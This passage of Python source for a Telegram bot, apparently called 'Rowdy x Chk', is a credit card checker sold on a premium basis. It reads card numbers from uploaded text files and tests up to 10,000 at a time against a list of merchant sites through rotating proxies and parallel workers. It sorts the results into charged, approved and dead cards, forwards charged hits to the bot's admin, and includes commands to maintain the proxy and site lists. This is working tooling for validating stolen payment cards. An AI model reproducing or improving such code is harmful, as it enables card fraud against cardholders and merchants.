        stats['total_checks'] = stats.get('total_checks', 0) + 1
        if result['status'] in ['Charged', 'Approved']:
            stats['total_hits'] = stats.get('total_hits', 0) + 1
        if str(user_id) in stats.get('users', {}):
            stats['users'][str(user_id)]['checks'] = stats['users'][str(user_id)].get('checks', 0) + 1
            if result['status'] in ['Charged', 'Approved']:
                stats['users'][str(user_id)]['hits'] = stats['users'][str(user_id)].get('hits', 0) + 1
            stats['users'][str(user_id)]['last_used'] = datetime.now().isoformat()
        save_stats(stats)

        try:
            await status_msg.delete()
        except:
            pass

    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ <b>Error:</b> {e}"), parse_mode='html')
        except:
            pass

# ==================== MAIN CHECK COMMAND WITH WORKERS ====================

@bot.on(events.NewMessage(pattern='/msh'))
async def check_command(event):
    user_id = event.sender_id

    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(
            premium_emoji("💎 <b>Premium Required</b>\n\nThis feature is for premium users only.\nUse <code>/redeem [key]</code> to activate."),
            buttons=[Button.inline("🔑 Redeem Key", "redeem")],
            parse_mode='html'
        )
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ <b>Reply to a .txt file</b>"), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ <b>Please reply to a .txt file</b>"), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Add proxies."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("⏳ <b>Processing file...</b>"), parse_mode='html')

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("❌ <b>No valid cards found</b>"), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 10000:
        await status_msg.edit(premium_emoji(f"⚠️ <b>{len(cards)} cards</b> - Limiting to 10000"), parse_mode='html')
        cards = cards[:10000]

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"⚡ <b>Starting check</b>  ·  {total_cards} cards  ·  {WORKER_COUNT} workers"), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'error_cards': [],
        'errors': 0,
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }

    is_prem = is_premium(user_id) or is_admin(user_id)
    dead_sites_to_remove = set()

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(0.5)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                res = await check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES)
                
                all_results['checked'] += 1
                
                if res.get('site') and res.get('status') == 'Site Error':
                    dead_sites_to_remove.add(res['site'])
                
                if res.get('status') == 'Site Error':
                    all_results['errors'] += 1
                    all_results['error_cards'].append(res)
                
                response_msg = res.get('message', '').lower()
                is_otp_or_3ds = 'otp_required' in response_msg or '3ds_required' in response_msg
                
                try:
                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                        await forward_charge_to_admin(card, res, user_id, username)
                        await send_animated_result(user_id, res, 'Charged', username, is_prem)
                    elif res['status'] == 'Approved':
                        if is_otp_or_3ds:
                            all_results['approved'].append(res)
                            await send_otp_result(user_id, res, username)
                        else:
                            all_results['approved'].append(res)
                            await send_animated_result(user_id, res, 'Approved', username, is_prem)
                    else:
                        all_results['dead'].append(res)
                except Exception as send_error:
                    print(f"Send error for card {card}: {send_error}")
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                now = time.time()
                if now - last_update_time[0] >= PROGRESS_UPDATE_INTERVAL:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username)
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(WORKER_COUNT)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=0.5)
            workers = list(pending)
        
        if session_key in active_sessions:
            try:
                await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username)
            except:
                pass

        if dead_sites_to_remove and is_admin(user_id):
            current_sites = load_sites()
            new_sites = [s for s in current_sites if s not in dead_sites_to_remove]
            if len(new_sites) != len(current_sites):
                write_file_lines(SITES_FILE, new_sites)
                try:
                    await bot.send_message(
                        user_id, 
                        f"🗑️ {len(current_sites) - len(new_sites)} dead sites auto-removed from sites.txt!\n\n" + 
                        "\n".join(list(dead_sites_to_remove)[:10])
                    )
                except:
                    pass

        stats = load_stats()
        stats['total_checks'] = stats.get('total_checks', 0) + len(cards)
        stats['total_hits'] = stats.get('total_hits', 0) + len(all_results['charged']) + len(all_results['approved'])
        if str(user_id) not in stats.get('users', {}):
            stats['users'] = stats.get('users', {})
        stats['users'][str(user_id)] = stats['users'].get(str(user_id), {})
        stats['users'][str(user_id)]['checks'] = stats['users'][str(user_id)].get('checks', 0) + len(cards)
        stats['users'][str(user_id)]['hits'] = stats['users'][str(user_id)].get('hits', 0) + len(all_results['charged']) + len(all_results['approved'])
        stats['users'][str(user_id)]['last_used'] = datetime.now().isoformat()
        save_stats(stats)

    except Exception as e:
        try:
            await bot.send_message(user_id, premium_emoji(f"❌ <b>Error:</b> {e}"), parse_mode='html')
        except:
            pass
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass

        try:
            await send_final_results(user_id, all_results)
        except:
            pass

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id

    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is empty"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"⏳ <b>Checking {len(proxies)} proxies...</b>"), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 100

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            try:
                await status_msg.edit(
                    premium_emoji(
                        f"⏳ <b>Checking proxies...</b>\n\n"
                        f"<b>Checked :</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
                        f"<b>✅ Alive :</b> {len(alive_proxies)}\n"
                        f"<b>❌ Dead :</b> {len(dead_proxies)}"
                    ),
                    parse_mode='html'
                )
            except:
                pass

        write_file_lines(PROXY_FILE, alive_proxies)

        summary_msg = f"<b>✅ Proxy Check Complete!</b>\n\n"
        summary_msg += f"<b>Total :</b> {len(proxies)}\n"
        summary_msg += f"<b>✅ Alive :</b> {len(alive_proxies)}\n"
        summary_msg += f"<b>❌ Removed :</b> {len(dead_proxies)}"

        try:
            await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        except:
            pass

    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        except:
            pass

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id

    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ <code>sites.txt</code> is empty"), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"⏳ <b>Checking {len(sites)} sites...</b>"), parse_mode='html')

    alive_sites = []
    dead_sites = []
    batch_size = 20
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: fresh_proxies = proxies

            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            try:
                await status_msg.edit(
                    premium_emoji(
                        f"⏳ <b>Checking sites...</b>\n\n"
                        f"<b>Checked :</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                        f"<b>✅ Alive :</b> {len(alive_sites)}\n"
                        f"<b>❌ Dead :</b> {len(dead_sites)}"
                    ),
                    parse_mode='html'
                )
            except:
                pass

        write_file_lines(SITES_FILE, alive_sites)

        summary_msg = f"<b>✅ Site Check Complete!</b>\n\n"
        summary_msg += f"<b>Total :</b> {len(sites)}\n"
        summary_msg += f"<b>✅ Alive :</b> {len(alive_sites)}\n"
        summary_msg += f"<b>❌ Removed :</b> {len(dead_sites)}"

        try:
            await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        except:
            pass

    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 <b>Checking proxy...</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    write_file_lines(PROXY_FILE, new_proxies)

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    write_file_lines(PROXY_FILE, new_proxies)

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty"), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(f"📦 <b>Backup created</b> - {count} proxies"),
            file=backup_filename,
            parse_mode='html'
        )
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    write_file_lines(PROXY_FILE, [])

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)})</b>"), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addproxy</code> followed by proxies, one per line."), parse_mode='html')
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return

        current_proxies = load_proxies()
        new_proxies = []

        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All proxies already exist"), parse_mode='html')
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ <b>Added {len(new_proxies)} proxies!</b>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def remove_site_command_user(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != url_to_remove]
        write_file_lines(SITES_FILE, new_sites)

        await event.reply(premium_emoji(f"✅ <b>Site Removed!</b>\n\n<code>{url_to_remove}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    stats = load_stats()
    if 'users' not in stats:
        stats['users'] = {}
    if str(user_id) not in stats['users']:
        stats['users'][str(user_id)] = {'checks': 0, 'hits': 0, 'last_used': datetime.now().isoformat()}
    save_stats(stats)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    await send_start_video_and_welcome(user_id, username)

# ============================================================
# MAIN
# ============================================================

bot_start_time = time.time()

print("✅ Rowdy x Chk — STARTED  v3.0")
print("👑 Owner: @Rowdyking07")
print("=" * 60)
print(f"⚡️ {WORKER_COUNT} WORKERS CONFIGURED FOR STABLE SPEED")
print("🛠️ 7+ TOOLS INCLUDED")
print("🔥 BACKEND: CHECKER ENGINE")
print("=" * 60)

try:
    bot.run_until_disconnected()
finally:
    if http_session and not http_session.closed:
        asyncio.run(http_session.close())
